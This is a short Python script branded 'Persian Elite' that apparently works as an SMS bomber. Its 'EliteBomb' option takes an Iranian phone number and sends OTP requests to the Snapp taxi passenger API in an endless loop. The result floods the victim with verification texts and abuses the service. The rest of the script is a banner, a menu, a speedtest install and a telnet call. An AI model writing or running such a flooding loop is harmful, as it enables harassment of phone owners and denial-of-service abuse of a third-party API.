import requests
import os
red='\033[31m'
green='\033[32m'
blue='\033[36m'
pink='\033[35m'
rang='\033[34m'
link = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
os.system("for i in {1..12}; do for j in $(seq 1 $i); do echo -ne $iÃ—$j=$((i*j))\\t;done; echo;done")
os.system("clear")
print(f"{red} ")
print("        ,     \    /      , ")
print("       / \    )\__/(     / \ ")
print("      /   \  (_\  /_)   /   \ ")
print(" ____/_____\__\@  @/___/_____\____ ")
print("|             |\../|              | ")
print("|              \VV/               | ")
print("|        Persian Elite  YT        | ")
print("|_________________________________| ")
print(" |    /\ /      \\        \ /\    | ")
print(" |  /   V       ))        V   \  | ")
print(" |/     °       //        °     \| ")
print(" °              V                ° ")
print(f"{pink} ")
print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
print(f"{blue} ")
print("Telegram : @Persian_Elite")
print("YouTube  : YouTube.com/PersianElite")
print(f"{pink} ")
print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
print(f"{green} ")
print("|1|EliteBomb")
print("|2|TestNet")
print("|3|Exit")
print(f"{rang} ")
Elite = int(input("|∆|choose <>> : "))
if Elite == 1:
    number = input("please send number {9×××××××} : ")
    while True:
              requests.post(link,data={"cellphone":"+98"+number})
              print("Successfully sended", number)
elif Elite == 3:
    os.system("clear")
    os.system("figlet PersianElite ")
elif Elite == 2:
    os.system("clear")
    os.system("pip install speedtest-cli")
    os.system("speedtest-cli")
elif Elite == 4:
    os.system("telnet towel.blinkenlights.nl")
